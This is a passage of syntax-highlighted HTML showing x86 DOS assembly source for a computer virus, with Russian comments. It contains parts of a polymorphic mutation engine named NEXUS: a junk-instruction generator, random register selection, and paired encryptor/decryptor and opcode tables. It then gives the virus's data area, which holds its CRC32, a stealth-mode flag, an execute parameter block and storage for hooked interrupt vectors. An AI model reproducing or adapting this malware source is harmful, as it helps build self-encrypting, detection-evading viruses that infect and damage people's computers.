        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">no_store</span><span class="sc0">       </span><span class="sc1">; bytes after instruction</span><span class="sc0">
 </span><span class="sc5">rndb</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rndb</span><span class="sc0">
 </span><span class="sc5">no_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; number of bytes of the instruction</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gloop</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">garb_ret</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gloop</span><span class="sc0">

 </span><span class="sc5">garb_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">wflag</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">wflag</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; gets random REG field into al without [r_used ]</span><span class="sc0">
 </span><span class="sc5">get_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; get random value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">wflag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; check REG</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">r16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11111011b</span><span class="sc0">    </span><span class="sc1">; 8-bit regs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">allbits</span><span class="sc0">

 </span><span class="sc5">r16</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">100b</span><span class="sc0">         </span><span class="sc1">; check for SP REG</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_reg</span><span class="sc0">
 </span><span class="sc5">allbits</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">r_used</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; 16-bit regs</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_reg</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; encryptors    FEDCBA98  76543210</span><span class="sc0">
</span><span class="sc1">; dectyptors    ||||||||  ||||||||</span><span class="sc0">
 </span><span class="sc5">crins</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">00110000b</span><span class="sc0">       </span><span class="sc1">; XOR</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">00110000b</span><span class="sc0">       </span><span class="sc1">; XOR</span><span class="sc0">

 </span><span class="sc5">cp2n</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">       </span><span class="sc1">; ADD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">00101000b</span><span class="sc0">       </span><span class="sc1">; SUB</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">00101000b</span><span class="sc0">       </span><span class="sc1">; SUB</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">       </span><span class="sc1">; ADD</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">; ROR</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">       </span><span class="sc1">; ROL</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">       </span><span class="sc1">; ROL</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">; ROR</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc2">00010000b</span><span class="sc0">       </span><span class="sc1">; NOT</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc2">00010000b</span><span class="sc0">       </span><span class="sc1">; NOT</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc2">00011000b</span><span class="sc0">       </span><span class="sc1">; NEG</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc2">00011000b</span><span class="sc0">       </span><span class="sc1">; NEG</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11111110b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">       </span><span class="sc1">; INC</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11111110b</span><span class="sc4">,</span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">; DEC</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11111110b</span><span class="sc4">,</span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">; DEC</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11111110b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">       </span><span class="sc1">; INC</span><span class="sc0">
 </span><span class="sc5">ctotal</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">crins</span><span class="sc4">)/(</span><span class="sc5">cp2n</span><span class="sc4">-</span><span class="sc5">crins</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; opcodes       FEDCBA98  76543210</span><span class="sc0">
</span><span class="sc1">; table         ||||||||  ||||||||</span><span class="sc0">
 </span><span class="sc5">opcz</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000110b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">       </span><span class="sc1">; opcode   (MOVL)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
 </span><span class="sc5">op2n</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">       </span><span class="sc1">; opcode   (ADD)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11101000b</span><span class="sc0">       </span><span class="sc1">; opcode   (SUB)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">       </span><span class="sc1">; opcode   (CMP)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110111b</span><span class="sc4">,</span><span class="sc2">11011000b</span><span class="sc0">       </span><span class="sc1">; opcode   (NEG16)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110111b</span><span class="sc4">,</span><span class="sc2">11010000b</span><span class="sc0">       </span><span class="sc1">; opcode   (NOT16)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">       </span><span class="sc1">; opcode   (AND)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">       </span><span class="sc1">; opcode   (TEST)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11001000b</span><span class="sc0">       </span><span class="sc1">; opcode   (OR)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11110000b</span><span class="sc0">       </span><span class="sc1">; opcode   (XOR)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11011000b</span><span class="sc0">       </span><span class="sc1">; opcode   (SBB)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc2">11010000b</span><span class="sc0">       </span><span class="sc1">; opcode   (ADC)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11001101b</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">       </span><span class="sc1">; opcode   (INT 01)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11001101b</span><span class="sc4">,</span><span class="sc2">00000011b</span><span class="sc0">       </span><span class="sc1">; opcode   (INT 03)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01110000b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (Jxx $+2)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111000b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (Jxx $+2)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11100011b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (Jcxz $+2)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101011b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (Jmp short $+2)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
 </span><span class="sc5">onebyte</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; - One-byte instructions</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10110000b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (MOV)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bh</span><span class="sc0">                       </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01000000b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (INC)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01001000b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (DEC)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11001100b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (int3)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11111000b</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; opcode   (S/Cf)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                      </span><span class="sc1">; W field ptr (FF if none)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; "reg" bit ptr (FF if none)</span><span class="sc0">
 </span><span class="sc5">total</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">opcz</span><span class="sc4">)/(</span><span class="sc5">op2n</span><span class="sc4">-</span><span class="sc5">opcz</span><span class="sc4">)</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; конец подсчета CRC</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">end_crc</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">random1</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; пара случайных чисел</span><span class="sc0">
 </span><span class="sc5">random2</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">checksum</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0f90738adh</span><span class="sc1">; CRC32 вируса</span><span class="sc0">

 </span><span class="sc5">epb</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; Execute Parameter Block</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; командная строка</span><span class="sc0">
 </span><span class="sc5">seg0</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5ch</span><span class="sc0">       </span><span class="sc1">; FCB#1</span><span class="sc0">
 </span><span class="sc5">seg1</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6ch</span><span class="sc0">       </span><span class="sc1">; FCB#2</span><span class="sc0">
 </span><span class="sc5">seg2</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">original</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">nex_ptr</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; указатель на расшифровщик</span><span class="sc0">
 </span><span class="sc5">signature</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">ssize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; область недисковых данных - конец файловой части вируса</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">eov</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">io08</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ячейки хранения векторов</span><span class="sc0">
 </span><span class="sc5">io21p</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; прерываний</span><span class="sc0">
 </span><span class="sc5">io24</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">stf</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; режим стелс (mcbcheck)</span><span class="sc0">
 </span><span class="sc5">command</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; command.com (mcbcheck)</span><span class="sc0">
 </span><span class="sc5">seek_pos</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; позиция указателя (SeekSave)</span><span class="sc0">
 </span><span class="sc5">nrbytes</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; прочитанные байты (ReadStealth)</span><span class="sc0">
 </span><span class="sc5">rm_field</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; хранение R/M поля индекса (NEXUS)</span><span class="sc0">
 </span><span class="sc5">r_used</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 2 используемых регистра (NEXUS)</span><span class="sc0">
 </span><span class="sc5">offs_ptr</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; (NEXUS)</span><span class="sc0">
 </span><span class="sc5">cr_ptr</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; (NEXUS)</span><span class="sc0">
 </span><span class="sc5">wflag</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; флаг W опкода (NEXUS)</span><span class="sc0">
 </span><span class="sc5">do_enc</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; опкод-буфер (NEXUS/CRLOAD)</span><span class="sc0">
 </span><span class="sc5">fn_ptr</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; имя файла (ClrAttrib)</span><span class="sc0">
